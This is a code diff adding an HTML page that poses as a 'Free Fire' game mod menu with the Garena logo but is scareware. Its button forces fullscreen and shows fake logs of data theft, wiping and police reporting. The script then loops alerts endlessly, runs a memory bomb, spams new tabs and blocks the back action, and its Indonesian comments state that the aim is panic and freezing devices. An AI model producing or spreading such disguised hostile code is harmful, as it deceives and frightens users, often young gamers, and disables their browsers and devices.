@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREE FIRE MOD MENU V5.0 - DARK AI</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; text-align: center; overflow: hidden; }
+        .container { margin-top: 50px; }
+        .btn { background: #f00; color: #fff; padding: 20px; border: none; font-weight: bold; cursor: pointer; border-radius: 10px; font-size: 20px; }
+        .btn:hover { background: #b00; }
+        #scare-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; color: red; padding: 20px; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main">
+    <h1>🔥 FF MOD MENU VVIP 🔥</h1>
+    <p>Auto Headshot, Wallhack, Diamond Hack</p>
+    <img src="https://garena.com/garena_logo.png" width="150"><br><br>
+    <button class="btn" onclick="startPanic()">START INJECT MOD</button>
+</div>
+
+<div id="scare-ui">
+    <h2 id="log">Initializing Exploit...</h2>
+</div>
+
+<script>
+function startPanic() {
+    // 1. Fullscreen Paksa
+    let elem = document.documentElement;
+    if (elem.requestFullscreen) elem.requestFullscreen();
+
+    document.getElementById('main').style.display = 'none';
+    document.getElementById('scare-ui').style.display = 'block';
+
+    // 2. Fake Log Script biar Panik
+    let logs = [
+        "[+] Accessing Internal Storage...",
+        "[+] Uploading Gallery to Server 182.xx.xx.xx...",
+        "[+] Bypassing Google Account Security...",
+        "[+] Resetting System Android...",
+        "[!] WARNING: CRITICAL SYSTEM ERROR!",
+        "[!] DELETING DATA /SDCARD/0/...",
+        "[!] SENDING COORDINATES TO POLRI.GO.ID..."
+    ];
+
+    let i = 0;
+    let logDiv = document.getElementById('log');
+    let interval = setInterval(() => {
+        if (i < logs.length) {
+            logDiv.innerHTML += "<br>" + logs[i];
+            i++;
+        } else {
+            clearInterval(interval);
+            triggerChaos();
+        }
+    }, 800);
+}
+
+function triggerChaos() {
+    // 3. Loop Alert Gak Berhenti (Bikin browser beku)
+    while(true) {
+        alert("DARK AI HAS TAKEN CONTROL OF YOUR DEVICE!");
+        alert("YOUR DATA IS BEING WIPED...");
+        
+        // 4. Memory Bomb (Makan RAM biar HP nge-lag parah)
+        let bomb = [];
+        for (let i = 0; i < 1000000; i++) {
+            bomb.push(new ArrayBuffer(1000000));
+        }
+
+        // 5. Spam Tab Baru (Kalo di PC bakal lgsg tewas)
+        window.open(window.location.href, '_blank');
+    }
+}
+
+// 6. Cegah Tombol Back
+window.onbeforeunload = function() {
+    return "LU GAK BISA KABUR DARI DARK AI!";
+};
+</script>
+
+</body>
+</html>
